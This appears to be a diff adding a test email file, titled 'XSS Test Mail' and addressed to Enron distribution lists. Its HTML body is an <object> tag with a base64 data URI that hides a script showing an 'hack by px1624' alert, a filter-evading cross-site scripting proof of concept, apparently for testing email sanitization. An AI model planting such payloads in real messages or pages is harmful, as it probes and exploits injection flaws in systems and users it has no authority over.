@@ -1,0 +1,7 @@
+From: chelfert@aol.com
+To: accounting.dl-isc@enron.com, cio.dl-isc@enron.com, hr.dl-isc@enron.com, 
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFjayBieSBweDE2MjQiKTwvc2NyaXB0Pg==">
